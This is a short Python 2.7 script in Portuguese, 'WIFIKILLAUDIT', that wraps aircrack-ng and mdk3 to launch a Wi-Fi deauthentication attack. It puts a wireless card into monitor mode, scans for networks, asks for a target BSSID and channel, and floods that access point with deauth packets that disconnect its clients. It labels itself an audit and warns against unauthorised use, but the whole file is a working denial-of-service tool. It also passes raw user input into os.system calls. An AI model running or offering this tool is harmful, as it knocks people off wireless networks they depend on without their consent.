#/usr/bin/env python
# -*- coding: utf-8 -*-

#Code: Renan H
#Github: https://github.com/c130rg
#Versão 1.0
#Python 2.7 (As proximas versões serão p/ Python3)

import os

os.system("clear")

print("*************************")
print("***** WIFIKILLAUDIT *****")
print("*************************")
print("ATENÇÃO: ESSE SCRIPT TEM A FUNÇÃO DE TESTAR A ESTABILIDADE DE REDES SEM FIO.")
print("NÃO TESTE SEM AUTORIZAÇÃO! RESPEITE AS LEGISLAÇÕES!")
print("O AUTOR NÃO SE RESPONSÁBILIZA POR DANOS CAUSADOS")
print("*************************")
print("É necessário ter o Aircrack-ng e o MDK3 instalado!")
print("*************************")


def rede():
	global inter
	print ("A placa de rede sem fio precisa ter a capacidade de entrar em modo monitor\n")
	os.system('ifconfig')
	inter = raw_input("Digite a interface de rede sem fio (ex: wlan0)...: ")
	wifidump()

def wifidump():
	global bssid, ch
	os.system("clear")
	os.system("airmon-ng start "+ inter)
	print("Sua placa foi alterada para o modo monitor com sucesso! Agora vamos escutar as redes em volta")
	print("ATENÇAÕ: Quando a rede alvo for detectada, pressione CRTL+C para parar a escuta")
	raw_input("Pressione qualquer tecla para continuar... ")
	os.system ("airodump-ng "+ inter +"mon")
	bssid = raw_input("Digite o BSSID do alvo...: ")
	ch = raw_input("Digite o canal da rede alvo...: ")
	deauth()

def deauth():
	blacklist = open("blacklist.txt","a")
	blacklist.write(bssid)
	blacklist.close()
	print("ATAQUE EM ANDAMENTO, PRESSIONE QUALQUER CRTL+C PARA PARAR")
	os.system("mdk3 "+ inter +"mon d -c "+ ch +" -b blacklist.txt")
	print ("Ataque parado com sucesso")
	os.system("rm blacklist.txt")
	r = raw_input("Deseja testar outro alvo? (S/N)...: ")
	if r == "S":
		wifidump()
	else:
		exit()

def exit():
	os.system("airmon-ng stop "+ inter+"mon")
	print("LEMBRE-SE: TESTAR SEM AUTORIZAÇÃO É CRIME")

rede()
